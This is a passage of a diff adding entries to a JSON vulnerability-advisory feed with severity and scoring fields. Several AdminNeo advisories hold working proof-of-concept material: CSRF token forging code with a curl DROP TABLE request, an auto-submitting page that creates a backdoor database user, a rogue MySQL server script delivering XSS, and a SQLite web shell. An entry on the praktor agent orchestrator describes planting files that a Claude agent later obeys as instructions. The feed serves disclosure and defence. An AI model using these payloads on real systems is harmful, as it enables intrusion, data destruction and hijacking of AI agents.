+      "title": "AdminNeo: CSRF Token Secret Recoverable from Single Observed Token, Enabling Cross-Site Request Forgery",
+      "description": "### Summary\n\nAdminNeo's CSRF protection uses a BREACH-resistant XOR masking scheme, but the implementation transmits both the XOR mask and the masked value in every token. This allows any observer who sees a single CSRF token (via network sniffing, log files, Referrer header, or XSS) to instantly recover the session secret and forge unlimited valid CSRF tokens. Additionally, the underlying session token has only ~20 bits of entropy (`rand(1, 1e6)`), making blind brute-force feasible even without token observation.\n\nOriginally reported by @az0mb13 in Adminer: [GHSA-q4f2-39gr-45jh](https://github.com/vrana/adminer/security/advisories/GHSA-33j4-hc95-pggg)\n\n### Details\nToken generation in `admin/include/functions.inc.php` lines 1181-1184:\n\n```php\nfunction get_token() {\n\t$rand = rand(1, 1e6);\n\treturn ($rand ^ $_SESSION[\"token\"]) . \":$rand\";\n}\n```\n\nToken verification in lines 1189-1192:\n\n```php\nfunction verify_token() {\n\tlist($token, $rand) = explode(\":\", $_POST[\"token\"]);\n\treturn ($rand ^ $_SESSION[\"token\"]) == $token;\n}\n```\n\nSession token initialized in `admin/include/auth.inc.php` lines 327 and 385:\n\n```php\n$_SESSION[\"token\"] = rand(1, 1e6);\n```\n\n**Three distinct weaknesses:**\n1. **Instant recovery:** The token format `(rand XOR secret):rand` transmits both operands. Recovery is trivial: `secret = masked_value XOR rand`.\n2. **Low entropy**: Only 1,000,000 possible session tokens (~20 bits). Blind brute-force requires at most 1M requests.\n3. **Loose comparison**: `verify_token()` uses `==` (loose comparison) instead of `===`, enabling PHP type juggling.\n\n### PoC\n\n**Validated against a live AdminNeo 5.5.0 instance (MySQL 8.0, PHP 8.2).**\n\n**Step 1: Observe a single CSRF token**\n\nLoad any authenticated AdminNeo page and extract a token from the HTML source. Tokens appear in hidden form fields:\n\n```html\n<input type='hidden' name='token' value='222277:990527'>\n```\n\nToken observation vectors: Referrer header leak, shared proxy logs, browser history, limited XSS, network sniffing.\n\n**Step 2: Recover the session secret (instant, 1 XOR operation)**\n\n```python\nobserved = \"542273:441804\"\nmasked, rand_val = observed.split(\":\")\nsession_secret = int(masked) ^ int(rand_val)\n# Result: 817530\n```\n\nThe token format is `(rand XOR secret):rand`. Both operands are transmitted, so the secret is recovered with a single XOR — zero additional requests needed.\n\n**Step 3: Forge unlimited valid CSRF tokens**\n\n```python\nimport random\nforge_rand = random.randint(1, 1000000)\nforged = f\"{forge_rand ^ session_secret}:{forge_rand}\"\n# Example output: 729376:481370\n```\n\nEach forged token is unique and valid. The attacker can generate as many as needed.\n\n**Step 4: Execute arbitrary SQL with the forged token**\n\n```shell\n# Forged token used to DROP a table the attacker never had a token for:\ncurl -b victim_cookies.txt \\\n  'http://target/adminneo/?mysql=127.0.0.1&username=root&db=testdb&sql=' \\\n  --data-urlencode \"token=729376:481370\" \\\n  --data-urlencode \"query=DROP TABLE csrf_victim_table;\" \\\n  -d \"limit=0\"\n```\n\n**Step 5: Verify a random wrong token is rejected (control)**\n\n```shell\ncurl -b victim_cookies.txt \\\n  'http://target/adminneo/?mysql=127.0.0.1&username=root&db=testdb&sql=' \\\n  --data-urlencode \"token=111:222\" \\\n  --data-urlencode \"query=SELECT 1\" -d \"limit=1\"\n# Result: \"Invalid CSRF token. Send the form again.\"\n```\n\n**Weaponized CSRF attack page**\n\nIn a real attack, the attacker hosts this HTML page and lures the victim to visit it while authenticated to AdminNeo:\n\n```html\n<html><body>\n<h1>Click here for free database optimization tips</h1>\n<!-- Attacker recovered secret 817530 from an observed token -->\n<!-- Forged token: 729376:481370 -->\n<iframe style=\"display:none\" name=\"x\"></iframe>\n<form id=\"f\" method=\"POST\" target=\"x\"\n      action=\"http://target/adminneo/?mysql=127.0.0.1&username=root&db=production&sql=\">\n  <input type=\"hidden\" name=\"token\" value=\"729376:481370\">\n  <input type=\"hidden\" name=\"query\" value=\"CREATE USER 'backdoor'@'%' IDENTIFIED BY 'p@ss'; GRANT ALL ON *.* TO 'backdoor'@'%' WITH GRANT OPTION;\">\n  <input type=\"hidden\" name=\"limit\" value=\"0\">\n</form>\n<script>document.getElementById('f').submit();</script>\n</body></html>\n```\n\n### Impact\n\n- **Cross-Site Request Forgery** against authenticated AdminNeo users. Validated: forged token used to CREATE TABLE, INSERT data, SELECT data, and DROP TABLE — all accepted by the server.\n- An attacker who observes a single CSRF token (via Referrer header, proxy logs, XSS, or network sniffing) can instantly recover the session secret and forge unlimited valid tokens.\n- With a forged token, the attacker can execute arbitrary SQL through the victim's session: drop tables/databases, exfiltrate data, create backdoor users, or modify records.\n- The low entropy (~20 bits, 1M possible values) also enables blind brute-force without observing any token, requiring at most 1M requests (~17 minutes at 1000 req/sec).",
+      "published": "2026-10-30T22:51:29Z",
+      "updated": "2026-10-30T22:51:31Z",
+      "cvss": 6.8,
+      "cvss_vector": "CVSS:3.1/AV:N/AC:H/PR:N/UI:R/S:U/C:N/I:H/A:H",
+      "severity": "medium",
+      "cpes": [],
+      "packages": [
+        "composer:adminneo-org/adminneo"
+      ],
+      "vendor_products": [],
+      "references": [
+        "https://github.com/advisories/GHSA-wm25-49w3-5qrg",
+        "https://github.com/adminneo-org/adminneo/security/advisories/GHSA-wm25-49w3-5qrg",
+        "https://github.com/adminneo-org/adminneo/commit/f575eee5e35eacd6c55a9912648e9e8fe24a9f44",
+        "https://github.com/adminneo-org/adminneo/releases/tag/v5.5.1",
+        "https://github.com/advisories/GHSA-wm25-49w3-5qrg"
+      ],
+      "exploit_ref": false,
+      "kev": false,
+      "kev_date_added": "",
+      "ransomware": false,
+      "ssvc_exploitation": "",
+      "epss": null,
+      "epss_percentile": null,
+      "x_mentions": null,
+      "sources": [
+        "ghsa"
+      ],
+      "category": "vuln",
+      "resolved_at": "",
+      "first_seen": "2026-10-30T22:58:56.692254+00:00",
+      "matched": [
+        "php"
+      ],
+      "match_type": "keyword",
+      "tier": 1,
+      "score": 39.6,
+      "level": "medium",
+      "score_breakdown": {
+        "popularity": 21.0,
+        "cvss": 13.6,
+        "unauth_network": 5
       },
       "ai_analysis": ""
     },
@@ -54119,6 +54418,57 @@
       "ai_analysis": ""
     },
     {
+      "id": "CVE-2026-93471",
+      "aliases": [],
+      "title": "",
+      "description": "Improper Handling of Highly Compressed Data (Data Amplification) in esaml_binding in dropbox esaml allows an unauthenticated attacker to exhaust server memory and crash the Erlang VM via a crafted compressed SAMLResponse.\n\nesaml_binding:decode_response/2 base64-decodes the attacker-supplied SAMLResponse, inflates it with zlib:unzip/1 with no bound on the output, then converts the result to a charlist with binary_to_list/1 before parsing. This runs on the SAML consume (ACS) and single-logout endpoints, which accept unauthenticated requests by design, and it runs before any signature check. A small deflate stream reaches a compression ratio near 1000 to 1, so a request body of tens of kilobytes inflates to hundreds of megabytes and then to several gigabytes of list heap, so a few requests exhaust memory and take the node down.\n\nThis issue affects esaml: from 0.1.0 onward.",
+      "published": "2026-10-22T09:17:16.827",
+      "updated": "2026-10-30T19:20:19.010",
+      "cvss": 8.7,
+      "cvss_vector": "CVSS:4.0/AV:N/AC:L/AT:N/PR:N/UI:N/VC:N/VI:N/VA:H/SC:N/SI:N/SA:N/E:X/CR:X/IR:X/AR:X/MAV:X/MAC:X/MAT:X/MPR:X/MUI:X/MVC:X/MVI:X/MVA:X/MSC:X/MSI:X/MSA:X/S:X/AU:X/R:X/V:X/RE:X/U:X",
+      "severity": "high",
+      "cpes": [],
+      "packages": [],
+      "vendor_products": [],
+      "references": [
+        "https://cna.erlef.org/cves/CVE-2026-93471.html",
+        "https://github.com/arekinath/esaml/commit/deeb84378d5c82153b470e99d24f77c38afca14a",
+        "https://github.com/dropbox/esaml/commit/deeb84378d5c82153b470e99d24f77c38afca14a",
+        "https://github.com/handnot2/esaml/commit/deeb84378d5c82153b470e99d24f77c38afca14a",
+        "https://osv.dev/vulnerability/EEF-CVE-2026-93471",
+        "https://cna.erlef.org/cves/CVE-2026-93471.html",
+        "https://osv.dev/vulnerability/EEF-CVE-2026-93471"
+      ],
+      "exploit_ref": false,
+      "kev": false,
+      "kev_date_added": "",
+      "ransomware": false,
+      "ssvc_exploitation": "",
+      "epss": 0.00438,
+      "epss_percentile": 0.38078,
+      "x_mentions": null,
+      "sources": [
+        "nvd"
+      ],
+      "category": "vuln",
+      "resolved_at": "",
+      "first_seen": "2026-10-30T22:58:56.692254+00:00",
+      "matched": [
+        "zlib"
+      ],
+      "match_type": "keyword",
+      "tier": 2,
+      "score": 36.5,
+      "level": "medium",
+      "score_breakdown": {
+        "popularity": 14.0,
+        "cvss": 17.4,
+        "unauth_network": 5,
+        "epss": 0.1
+      },
+      "ai_analysis": ""
+    },
+    {
       "id": "CVE-2026-116591",
       "aliases": [
         "GHSA-fpmh-frq8-7rj8"
@@ -54991,6 +55341,53 @@
       "ai_analysis": ""
     },
     {
+      "id": "CVE-2026-94482",
+      "aliases": [],
+      "title": "",
+      "description": "Next.js is a React framework for building full-stack web applications. From 13.0.0 until 15.5.28 and 16.4.1, crafted requests targeting App Router applications with at least one Server Action can cause excessive CPU consumption and block processing of further requests in the same process. Applications using the Pages Router and App Router applications without Server Actions are not affected. This issue is fixed in versions 15.5.28 and 16.4.1.",
+      "published": "2026-10-22T16:19:16.720",
+      "updated": "2026-10-30T19:20:19.390",
+      "cvss": 8.2,
+      "cvss_vector": "CVSS:4.0/AV:N/AC:L/AT:P/PR:N/UI:N/VC:N/VI:N/VA:H/SC:N/SI:N/SA:N/E:X/CR:X/IR:X/AR:X/MAV:X/MAC:X/MAT:X/MPR:X/MUI:X/MVC:X/MVI:X/MVA:X/MSC:X/MSI:X/MSA:X/S:X/AU:X/R:X/V:X/RE:X/U:X",
+      "severity": "high",
+      "cpes": [],
+      "packages": [],
+      "vendor_products": [],
+      "references": [
+        "https://github.com/vercel/next.js/releases/tag/v15.5.28",
+        "https://github.com/vercel/next.js/releases/tag/v16.4.1",
+        "https://github.com/vercel/next.js/security/advisories/GHSA-p3m5-59mp-jv5r"
+      ],
+      "exploit_ref": false,
+      "kev": false,
+      "kev_date_added": "",
+      "ransomware": false,
+      "ssvc_exploitation": "",
+      "epss": 0.00365,
+      "epss_percentile": 0.30385,
+      "x_mentions": null,
+      "sources": [
+        "nvd"
+      ],
+      "category": "vuln",
+      "resolved_at": "",
+      "first_seen": "2026-10-30T22:58:56.692254+00:00",
+      "matched": [
+        "nextjs"
+      ],
+      "match_type": "keyword",
+      "tier": 2,
+      "score": 35.5,
+      "level": "medium",
+      "score_breakdown": {
+        "popularity": 14.0,
+        "cvss": 16.4,
+        "unauth_network": 5,
+        "epss": 0.1
+      },
+      "ai_analysis": ""
+    },
+    {
       "id": "CVE-2026-97200",
       "aliases": [],
       "title": "",
@@ -55027,6 +55424,106 @@
       "first_seen": "2026-10-26T14:16:58.363768+00:00",
       "matched": [
         "zlib"
+      ],
+      "match_type": "keyword",
+      "tier": 2,
+      "score": 35.4,
+      "level": "medium",
+      "score_breakdown": {
+        "popularity": 14.0,
+        "cvss": 16.4,
+        "unauth_network": 5
+      },
+      "ai_analysis": ""
+    },
+    {
+      "id": "CVE-2026-62331",
+      "aliases": [],
+      "title": "",
+      "description": "praktor is a multi-agent Claude Code orchestrator with Telegram input and output, Docker isolation, and a Mission Control UI. Prior to 0.9.1, both Telegram upload sites in `internal/telegram/bot.go` concatenate the attacker-controlled document filename into a destination path without sanitization, and `path.Join` collapses parent-directory traversal. A remote Telegram user who can message the bot can therefore write outside `uploads/` within the persistent agent workspace mounted at `/workspace/agent`. Because `allow_from: []` permits all senders by default, no prior authentication or privilege is required in that configuration. The attacker can plant or overwrite `CLAUDE.md`, instruction, skill, hook, or configuration files that the Claude agent reads and operates on across later runs, turning a document upload into stored instruction injection. The demonstrated arbitrary-write scope is the persistent agent workspace volume, not an unrestricted host-filesystem write. This issue is fixed in version 0.9.1.",
+      "published": "2026-10-30T19:18:33.450",
+      "updated": "2026-10-30T20:17:12.210",
+      "cvss": 8.2,
+      "cvss_vector": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:L/I:H/A:N",
+      "severity": "high",
+      "cpes": [],
+      "packages": [],
+      "vendor_products": [],
+      "references": [
+        "https://github.com/mtzanidakis/praktor/commit/c3731eeda01c0b3ec1dbd13cccd5a147c3182141",
+        "https://github.com/mtzanidakis/praktor/pull/228",
+        "https://github.com/mtzanidakis/praktor/releases/tag/v0.9.1",
+        "https://github.com/mtzanidakis/praktor/security/advisories/GHSA-48v2-6jcm-fc99"
+      ],
+      "exploit_ref": false,
+      "kev": false,
+      "kev_date_added": "",
+      "ransomware": false,
+      "ssvc_exploitation": "",
+      "epss": null,
+      "epss_percentile": null,
+      "x_mentions": null,
+      "sources": [
+        "nvd"
+      ],
+      "category": "vuln",
+      "resolved_at": "",
+      "first_seen": "2026-10-30T22:58:56.692254+00:00",
+      "matched": [
+        "claude-code"
+      ],
+      "match_type": "keyword",
+      "tier": 2,
+      "score": 35.4,
+      "level": "medium",
+      "score_breakdown": {
+        "popularity": 14.0,
+        "cvss": 16.4,
+        "unauth_network": 5
+      },
+      "ai_analysis": ""
+    },
+    {
+      "id": "CVE-2026-96632",
+      "aliases": [
+        "GHSA-rx7m-wxwq-vxr9"
+      ],
+      "title": "AdminNeo Vulnerable to XSS via Rogue MySQL Server Version String (CSP Nonce Bypass)",
+      "description": "## Summary\n\nAdminNeo inserts the database server's version string into a `<script>` tag that carries a valid CSP nonce, without any sanitization. A rogue database server can return a crafted version string that breaks out of the JavaScript context and executes arbitrary code. Because the script tag already has a valid nonce, the browser's Content Security Policy does not block execution. No authentication is required when combined with Login CSRF.\n\nOriginally reported in Adminer: https://github.com/vrana/adminer/security/advisories/GHSA-h6jr-7pr6-grgj\n\n## Prerequisites\n\n- Target runs AdminNeo\n- Attacker controls a reachable MySQL server (a 80-line Python script)\n\n## Root Cause\n\n`admin/core/Admin.php`, lines 1285-1286:\n\n```php\necho script(\"let autocompletion;\\nwindow.addEventListener('DOMContentLoaded', () => { initSyntaxHighlighting('\" .\n    Connection::get()->getVersion() . \"', '\" . Connection::get()->getFlavor() . \"', autocompletion); });\");\n```\n\n`script()` wraps the output in `<script nonce=\"VALID_NONCE\">`. Return value of `Connection::get()->getVersion()` is not escaped.\n\n## Steps To Reproduce\n\n### 1. Build the environment\n\n**Dockerfile** (AdminNeo):\n\n```dockerfile\nFROM php:8.3-cli\nCOPY adminneo.php /var/www/adminneo.php\nWORKDIR /var/www\nEXPOSE 8081\nCMD [\"php\", \"-S\", \"0.0.0.0:8081\"]\n```\n\n**rogue_mysql.py** (fake MySQL server that accepts any login):\n\n```python\nimport socket, struct, threading\n\nPAYLOAD = \"1');alert(origin)//\"\n\n# Capability flags the client expects\nCAP_PROTOCOL_41     = 0x0200\nCAP_SECURE_CONNECTION = 0x8000\nCAP_PLUGIN_AUTH     = 0x00080000\nCAPS_LOW  = CAP_PROTOCOL_41 | CAP_SECURE_CONNECTION\nCAPS_HIGH = (CAP_PLUGIN_AUTH >> 16)\n\ndef make_packet(seq, payload):\n    length = struct.pack(\"<I\", len(payload))[:3]\n    return length + bytes([seq]) + payload\n\ndef make_greeting(version_str):\n    pkt  = b\"\\x0a\"                                  # protocol version 10\n    pkt += version_str.encode() + b\"\\x00\"            # version string\n    pkt += struct.pack(\"<I\", 1)                      # connection id\n    pkt += b\"\\x41\" * 8                               # auth plugin data part 1\n    pkt += b\"\\x00\"                                   # filler\n    pkt += struct.pack(\"<H\", CAPS_LOW)               # capability flags lower\n    pkt += b\"\\x21\"                                   # charset utf8\n    pkt += struct.pack(\"<H\", 0x0002)                 # status flags\n    pkt += struct.pack(\"<H\", CAPS_HIGH)              # capability flags upper\n    pkt += b\"\\x15\"                                   # auth data length (21)\n    pkt += b\"\\x00\" * 10                              # reserved\n    pkt += b\"\\x41\" * 12 + b\"\\x00\"                    # auth plugin data part 2\n    pkt += b\"mysql_native_password\\x00\"              # auth plugin name\n    return make_packet(0, pkt)\n\ndef make_ok(seq):\n    pkt  = b\"\\x00\"          # OK marker\n    pkt += b\"\\x00\"          # affected rows\n    pkt += b\"\\x00\"          # last insert id\n    pkt += struct.pack(\"<H\", 0x0002)  # status flags\n    pkt += struct.pack(\"<H\", 0)       # warnings\n    return make_packet(seq, pkt)\n\ndef make_eof(seq):\n    pkt  = b\"\\xfe\"\n    pkt += struct.pack(\"<H\", 0)       # warnings\n    pkt += struct.pack(\"<H\", 0x0002)  # status flags\n    return make_packet(seq, pkt)\n\ndef make_err(seq, msg=b\"not supported\"):\n    pkt  = b\"\\xff\"\n    pkt += struct.pack(\"<H\", 1045)\n    pkt += b\"#HY000\"\n    pkt += msg\n    return make_packet(seq, pkt)\n\ndef handle(conn):\n    conn.sendall(make_greeting(PAYLOAD))\n    try:\n        conn.recv(4096)     # client login request\n    except Exception:\n        conn.close()\n        return\n    conn.sendall(make_ok(2))  # accept login\n\n    # Answer any queries Adminer sends after login\n    while True:\n        try:\n            data = conn.recv(4096)\n            if not data:\n                break\n            seq = data[3] + 1\n            # Send ERR for all queries (Adminer still has the version in memory)\n            conn.sendall(make_err(seq))\n        except Exception:\n            break\n    conn.close()\n\nsrv = socket.socket()\nsrv.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)\nsrv.bind((\"0.0.0.0\", 3307))\nsrv.listen(5)\nprint(\"[*] Rogue MySQL on :3307 - version: \" + PAYLOAD)\nwhile True:\n    conn, addr = srv.accept()\n    print(f\"[+] Connection from {addr}\")\n    threading.Thread(target=handle, args=(conn,)).start()\n```\n\n```shell\n# Terminal 1: start Adminer\ndocker build -t adminer-xss .\ndocker run -d -p 8081:8081 --name adminer-xss adminer-xss\n\n# Terminal 2: start rogue MySQL\npython3 rogue_mysql.py\n```\n\n### 2. Trigger the XSS\n\nOpen a browser and navigate to `http://localhost:8081/adminneo.php`:\n\n1. Select driver: **MySQL**\n2. Server: `HOST_IP:3307` (IP of the machine running rogue_mysql.py)\n3. Username: `root`\n4. Password: `x`\n5. Click Login.\n\nThe rogue server accepts the login. AdminNeo renders the dashboard and includes:\n\n```html\n<script nonce=\"REAL_NONCE\">let autocompletion;\nwindow.addEventListener('DOMContentLoaded', () => { initSyntaxHighlighting('1');alert(origin)//', 'mysql', autocompletion); });</script>\n```\n\nThe browser executes `alert(origin)` with full CSP bypass because the script tag carries a valid nonce.\n\n### 3. Trigger it via Login CSRF\n\nThe login form has no CSRF token. An attacker page auto-submits the login, forcing the victim's browser to connect to the rogue server:\n\n```html\n<form id=\"f\" method=\"POST\" action=\"http://TARGET/adminneo.php\">\n  <input name=\"auth[driver]\" value=\"mysql\">\n  <input name=\"auth[server]\" value=\"ROGUE_IP:3307\">\n  <input name=\"auth[username]\" value=\"root\">\n  <input name=\"auth[password]\" value=\"x\">\n</form>\n<script>document.getElementById('f').submit()</script>\n```\n\n## Collaborator Request\n\nThis vulnerability was discovered jointly with Yashar Shahinzadeh (GitHub: @Voorivex). Could you please add him as a collaborator on this advisory and credit him as a co-discoverer? Thank you!",
+      "published": "2026-10-30T22:52:23Z",
+      "updated": "2026-10-30T22:52:23Z",
+      "cvss": 8.2,
+      "cvss_vector": "CVSS:4.0/AV:N/AC:H/AT:N/PR:N/UI:N/VC:N/VI:H/VA:N/SC:N/SI:N/SA:N",
+      "severity": "high",
+      "cpes": [],
+      "packages": [
+        "composer:adminneo-org/adminneo"
+      ],
+      "vendor_products": [],
+      "references": [
+        "https://github.com/advisories/GHSA-rx7m-wxwq-vxr9",
+        "https://github.com/adminneo-org/adminneo/security/advisories/GHSA-rx7m-wxwq-vxr9",
+        "https://github.com/vrana/adminer/security/advisories/GHSA-h6jr-7pr6-grgj",
+        "https://github.com/adminneo-org/adminneo/commit/2c86406808bc2517efb35f5595b3a05761c2eacd",
+        "https://github.com/adminneo-org/adminneo/releases/tag/v5.5.1",
+        "https://github.com/advisories/GHSA-rx7m-wxwq-vxr9"
+      ],
+      "exploit_ref": false,
+      "kev": false,
+      "kev_date_added": "",
+      "ransomware": false,
+      "ssvc_exploitation": "",
+      "epss": null,
+      "epss_percentile": null,
+      "x_mentions": null,
+      "sources": [
+        "ghsa"
+      ],
+      "category": "vuln",
+      "resolved_at": "",
+      "first_seen": "2026-10-30T22:58:56.692254+00:00",
+      "matched": [
+        "mysql"
       ],
       "match_type": "keyword",
       "tier": 2,
@@ -55565,6 +56062,51 @@
         "cvss": 16.2,
         "unauth_network": 5,
         "epss": 0.0
+      },
+      "ai_analysis": ""
+    },
+    {
+      "id": "CVE-2026-84243",
+      "aliases": [],
+      "title": "",
+      "description": "The gettext family of functions in the GNU C Library version 2.0 and later accept LANGUAGE environment variable entries that contain '/' or that are equal to \"..\", unless the program is setuid or setgid (AT_SECURE).  An attacker who can set LANGUAGE in the environment of a program that uses gettext can make it load a message catalog (.mo file) from an arbitrary location in the file system.  A crafted .mo file can crash the program through out-of-range offsets, or supply translations whose format directives do not match the arguments passed by the program.  That causes undefined behaviour in the printf family of functions and may allow arbitrary code execution with the privileges of the program.  The safety of message catalogs relies on them being installed in trusted, read-only locations, and the directory traversal bypasses this.\n\nThe fix for CVE-2014-0475 rejects \"..\" path components in locale names passed to setlocale or taken from the LC_ALL, LC_* and LANG environment variables.  gettext reads LANGUAGE directly and appends each colon-separated entry to the message catalog directory, so that fix did not cover LANGUAGE.\n\nLANGUAGE is only used when the LC_MESSAGES locale is not \"C\", \"C.<encoding>\" or \"POSIX\", so the attacker must also be able to select another installed locale, for example through LANG or LC_ALL.  Exploitation also requires that the attacker can place the crafted file in a location readable by the target program, and that the environment crosses a trust boundary without the program running as AT_SECURE.  An example is an SSH server that accepts LANGUAGE and LANG from clients through the AcceptEnv directive and restricts an account to a forced command; the attacker may use this to escape the restriction.",
+      "published": "2026-10-30T18:18:13.650",
+      "updated": "2026-10-30T20:17:20.137",
+      "cvss": 7.0,
+      "cvss_vector": "CVSS:3.1/AV:L/AC:H/PR:L/UI:N/S:U/C:H/I:H/A:H",
+      "severity": "high",
+      "cpes": [],
+      "packages": [],
+      "vendor_products": [],
+      "references": [
+        "https://inbox.sourceware.org/libc-alpha/20261012112453.47383-1-avinal.xlvii@gmail.com",
+        "https://sourceware.org/bugzilla/show_bug.cgi?id=17142",
+        "https://sourceware.org/git/?p=glibc.git;a=blob_plain;f=advisories/GLIBC-SA-2026-0025"
+      ],
+      "exploit_ref": false,
+      "kev": false,
+      "kev_date_added": "",
+      "ransomware": false,
+      "ssvc_exploitation": "",
+      "epss": null,
+      "epss_percentile": null,
+      "x_mentions": null,
+      "sources": [
+        "nvd"
+      ],
+      "category": "vuln",
+      "resolved_at": "",
+      "first_seen": "2026-10-30T18:53:00.917584+00:00",
+      "matched": [
+        "glibc"
+      ],
+      "match_type": "keyword",
+      "tier": 1,
+      "score": 35.0,
+      "level": "medium",
+      "score_breakdown": {
+        "popularity": 21.0,
+        "cvss": 14.0
       },
       "ai_analysis": ""
     },
@@ -56540,6 +57082,54 @@
       "first_seen": "2026-10-30T18:53:00.917584+00:00",
       "matched": [
         "curl"
+      ],
+      "match_type": "keyword",
+      "tier": 2,
+      "score": 34.1,
+      "level": "medium",
+      "score_breakdown": {
+        "popularity": 14.0,
+        "cvss": 15.0,
+        "unauth_network": 5,
+        "epss": 0.1
+      },
+      "ai_analysis": ""
+    },
+    {
+      "id": "CVE-2026-114136",
+      "aliases": [],
+      "title": "",
+      "description": "Django REST framework is a toolkit for building Web APIs. From 3.6.4 until 3.18.2, JSONParser.parse in rest_framework/parsers.py uses the client-supplied Content-Type charset value with codecs.getreader, which accepts byte-transform codecs such as bz2_codec rather than only text encodings. A remote unauthenticated client can therefore cause a compressed JSON request body to be expanded after Django has enforced DATA_UPLOAD_MAX_MEMORY_SIZE against only the wire bytes, allowing a very small request to consume substantial per-worker memory. The default parser set is sufficient, and any reachable endpoint that accepts a JSON body is affected. This issue is fixed in version 3.18.2.",
+      "published": "2026-10-21T20:17:25.557",
+      "updated": "2026-10-30T20:16:59.680",
+      "cvss": 7.5,
+      "cvss_vector": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:H",
+      "severity": "high",
+      "cpes": [],
+      "packages": [],
+      "vendor_products": [],
+      "references": [
+        "https://github.com/encode/django-rest-framework/commit/3c2634599b26a9f789b03045118dbc276117611a",
+        "https://github.com/encode/django-rest-framework/releases/tag/3.18.2",
+        "https://github.com/encode/django-rest-framework/security/advisories/GHSA-3547-9m27-7rxg",
+        "https://github.com/encode/django-rest-framework/security/advisories/GHSA-3547-9m27-7rxg"
+      ],
+      "exploit_ref": false,
+      "kev": false,
+      "kev_date_added": "",
+      "ransomware": false,
+      "ssvc_exploitation": "",
+      "epss": 0.00503,
+      "epss_percentile": 0.43041,
+      "x_mentions": null,
+      "sources": [
+        "nvd"
+      ],
+      "category": "vuln",
+      "resolved_at": "",
+      "first_seen": "2026-10-30T22:58:56.692254+00:00",
+      "matched": [
+        "django"
       ],
       "match_type": "keyword",
       "tier": 2,
@@ -57672,6 +58262,58 @@
         "cvss": 7.4,
         "unauth_network": 5,
         "epss": 0.0
+      },
+      "ai_analysis": ""
+    },
+    {
+      "id": "CVE-2026-96630",
+      "aliases": [
+        "GHSA-q5mp-gfjf-cf2j"
+      ],
+      "title": "AdminNeo: RCE via SQLite VACUUM INTO (ATTACH Blocklist Bypass)",
+      "description": "## Summary\nAdminer blocks `ATTACH` queries for SQLite to prevent arbitrary file creation. However, `VACUUM INTO` is not blocked and achieves the same result: writing a database file containing attacker-controlled PHP code to any path with any extension. An authenticated SQLite user can write a web shell to the web root and execute commands.\n\nOriginally reported in Adminer: [GHSA-q4f2-39gr-45jh](https://github.com/vrana/adminer/security/advisories/GHSA-gmx3-g29w-77wf)\n\n## Root Cause\nsql.inc.php, line 146:\n\n```php\nif (DIALECT == \"sqlite\" && preg_match(\"~^$space*+ATTACH\\\\b~i\", $q, $match)) {\n    // blocked\n}\n```\n\nOnly `ATTACH` is in the blocklist. `VACUUM INTO` (available since SQLite 3.27.0) writes the entire database to a new file at an arbitrary path with an arbitrary extension. It is not checked.\n\n## Steps To Reproduce\n\n### 1.  Login to SQLite\n1. Open AdminNeo and select driver: **SQLite**\n2. Login and create a new database (e.g., `stage.db`)\n\n### 2. Inject PHP code and write the shell\n\nNavigate to **SQL command** and execute:\n\n```sql\nCREATE TABLE \"<?php system($_GET['c']); ?>\" (i int);\nVACUUM INTO '/var/www/html/shell.php';\n```\n\nThe SQLite file is written to `/var/www/html/shell.php`. The table name containing `<?php` appears as raw bytes in the file. PHP's parser finds and executes it.\n\n### 3. Execute commands\n\n```shell\ncurl \"http://TARGET/shell.php?c=id\"\n# uid=0(root) gid=0(root) groups=0(root)\n```\n\n## Collaborator Request\n\nThis vulnerability was discovered jointly with Yashar Shahinzadeh (GitHub: @voorivex). Could you please add him as a collaborator on this advisory and credit him as a co-discoverer? Thank you!",
+      "published": "2026-10-30T22:51:37Z",
+      "updated": "2026-10-30T22:51:38Z",
+      "cvss": 7.2,
+      "cvss_vector": "CVSS:3.1/AV:N/AC:L/PR:H/UI:N/S:U/C:H/I:H/A:H",
+      "severity": "high",
+      "cpes": [],
+      "packages": [
+        "composer:adminneo-org/adminneo"
+      ],
+      "vendor_products": [],
+      "references": [
+        "https://github.com/advisories/GHSA-q5mp-gfjf-cf2j",
+        "https://github.com/adminneo-org/adminneo/security/advisories/GHSA-q5mp-gfjf-cf2j",
+        "https://github.com/adminneo-org/adminneo/commit/cf45efb3ac34e5e7b699cdc996f6eec2814ccda1",
+        "https://github.com/adminneo-org/adminneo/releases/tag/v5.5.1",
+        "https://github.com/advisories/GHSA-q5mp-gfjf-cf2j"
+      ],
+      "exploit_ref": false,
+      "kev": false,
+      "kev_date_added": "",
+      "ransomware": false,
+      "ssvc_exploitation": "",
+      "epss": null,
+      "epss_percentile": null,
+      "x_mentions": null,
+      "sources": [
+        "ghsa"
+      ],
+      "category": "vuln",
+      "resolved_at": "",
+      "first_seen": "2026-10-30T22:58:56.692254+00:00",
+      "matched": [
+        "sqlite"
+      ],
+      "match_type": "keyword",
+      "tier": 2,
+      "score": 33.4,
+      "level": "medium",
+      "score_breakdown": {
+        "popularity": 14.0,
+        "cvss": 14.4,
+        "rce": 5
       },
       "ai_analysis": ""
     },
@@ -59399,6 +60041,55 @@
       "ai_analysis": ""
     },
     {
+      "id": "CVE-2026-63121",
+      "aliases": [],
+      "title": "Kubewarden trusted-repos-policy: uppercase registry host bypasses registry/image deny rules",
+      "description": "Kubewarden policies is a collection of WebAssembly policies for securing and governing Kubernetes clusters. For versions provisionally classified as affected before 2.1.2, `trusted-repos-policy` compares an image's `registry` hostname against `reject lists` and `allow lists` case-sensitively even though `registry` DNS names are case-insensitive. An image with an uppercase or mixed-case `registry` hostname can miss a rejection rule for the equivalent lowercase host, so the admission policy accepts a resource whose container runtime pulls the same prohibited image. Only reject-list configurations have this bypass: allow-list configurations fail closed by over-denying differently cased hostnames. The security consequences depend on the configured rejection policy and deployment environment. This issue is fixed in version 2.1.2.",
+      "published": "2026-10-30T22:08:03.004Z",
+      "updated": "2026-10-30T22:16:58.123",
+      "cvss": 6.3,
+      "cvss_vector": "CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:U/C:L/I:L/A:L",
+      "severity": "medium",
+      "cpes": [],
+      "packages": [],
+      "vendor_products": [
+        "kubewarden policies"
+      ],
+      "references": [
+        "https://github.com/kubewarden/policies/security/advisories/GHSA-8p62-9vh2-272p",
+        "https://github.com/kubewarden/policies/commit/bc5597fcbbb0bc464b714ca7ff645c9743dea41b",
+        "https://github.com/kubewarden/policies/tree/trusted-repos-policy/v2.1.2"
+      ],
+      "exploit_ref": false,
+      "kev": false,
+      "kev_date_added": "",
+      "ransomware": false,
+      "ssvc_exploitation": "",
